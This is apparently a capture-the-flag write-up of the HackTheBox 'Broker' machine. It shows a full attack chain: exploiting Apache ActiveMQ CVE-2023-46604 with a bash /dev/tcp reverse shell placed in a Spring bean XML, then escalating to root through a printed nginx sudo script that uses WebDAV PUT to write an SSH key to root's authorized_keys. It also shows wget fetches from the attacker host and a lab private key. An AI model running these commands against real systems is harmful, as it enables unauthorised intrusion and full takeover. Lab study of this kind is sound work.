---
title: "HackTheBox - Broker"
published: true
---

| Field            | Details                                                                                                                                                                               |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Linux                                                                                                                                                                                 |
| **Difficulty**   | Easy                                                                                                                                                                                  |
| **Release Date** | 2023-11-09                                                                                                                                                                            |
| **Pwned Date**   | 2026-05-23                                                                                                                                                                            |
| **Tags**         | `Apache ActiveMQ` `CVE-2023-46604` `ClassPathXmlApplicationContext` `Dav Methods` `Go` `Nginx` `Nginx Sudo Privesc` `OpenWire` `ProcessBuilder` `Spring Bean` `Sudo Misconfiguration` |

## Summary

Broker is an easy difficulty Linux machine hosting Apache ActiveMQ. Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx, which is leveraged to gain root access.

## Reconnaissance

Start with a general sweep of all tcp ports

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt TARGET_IP
```

```
[snip]
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp
42543/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown
[snip]
```

Run a more in-depth scan on the detected ports

```bash
nmap -sC -sV -p 22,80,1883,5672,8161,42543,61613,61614,61616 -oN service_scan.txt <TARGET_IP>
```

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open  amqp?
|amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|  basic realm=ActiveMQRealm
|http-server-header: Jetty(9.4.39.v20210325)
42543/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|http-server-header: Jetty(9.4.39.v20210325)
| http-methods:
|  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
```

The box has an installation of Apache ActiveMQ, a message broker. All the listening ports are related to this service, except 22 (SSH).

Notice the line 'ActiveMQ OpenWire transport **5.15.15**'. Look for existing vulnerabilities affecting that version.

CVE --> https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/
Exploit PoC --> https://github.com/rootsecdev/CVE-2023-46604

The exploit uses a specific message type of the OpenWire protocol that makes the broker instantiate a java class by name. The vulnerability exists because the broker instantiate the class without any validation.
The class instantiated by the exploit with this trick is org.springframework.context.support.ClassPathXmlApplicationContext: a Spring class that fetches a file from a url and processes any Spring Bean definition found in the file.
The exploit defines a xml file that contains a Bean definition. The Bean is a 'ProcessBuilder', a Java class that runs system commands, and it’s configured to run a reverse shell.

## Foothold

Get the exploit

```bash
git clone https://github.com/rootsecdev/CVE-2023-46604.git
```

Listen on the attacking machine for the incoming reverse shell connection

```bash
nc -lvnp 9001
```

Start a python webserver from the exploit's dir: it's required to serve the poc-linux.xml file (the file containing the bean definition) to the target

```bash
python -m http.server
```

Change the following line of the poc-linux.xml file with the ip of the attacking machine

```
<value>bash -i >& /dev/tcp/<ATTACKING_MACHINE_IP_GOES_HERE>/9001 0>&1</value>
```

Install go (if necessary) and run the exploit

```bash
sudo apt install golang-go
go run main.go -i <TARGET_IP> -p 61616 -u http://<ATTACKER_IP>:8000/poc-linux.xml
```

A connection should be received on the listening port

```bash
listening on [any] 9001 ...
connect to [10.10.14.131] from (UNKNOWN) [10.129.230.87] 47226
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

A shell was established with user **activemq**.

## Privilege Escalation

Check sudo permissions

```bash
sudo -l
```

```
[snip]
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

The activemq user can run the 'sudo /usr/sbin/nginx' command without being prompted for password. This can be leveraged for local privilege escalation --> https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406

The exploit runs a instance of nginx with root privileges and **dav_methods PUT;**. These methods are for file management automation via the WebDAV protocol. The exploit creates ssh keys and, thanks to the sudo access to nginx and the PUT method, is able to copy the ssh public key in /root/.ssh/authorized_keys. The private key is printed to the screen and can be used to log in as root via ssh.

This is the exploit code

```bash
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

Create a 'privesc_nginx_exploit.sh' file with the exploit code.

The exploit requires an interactive shell (because of the ssh-keygen command) so upgrade the shell on target

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Start the python webserver to serve the exploit to the target.

Fetch the exploit on target and make it executable

```bash
wget http://<ATTACKER_IP>:8000/privesc_nginx_exploit.sh
chmod +x privesc_nginx_exploit.sh
```

Run the script

```bash
./privesc_nginx_exploit.sh
```

```
[snip]
[+] Display SSH Private Key for copy...
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
[+] Add key to root user...
[+] Use the SSH key to get access
```

The script generated the keys, copied the public one in the root user ssh folder and printed the private one.

Copy the private key in a file named 'root_key' on the attacking machine. Adjust its permissions so ssh does not complain

```bash
chmod 600 root_key
```

Establish ssh connection with the root user using root_key

```bash
ssh -i root_key root@<TARGET_IP>
```

```
[snip]
root@broker:~#
```

Got root access.
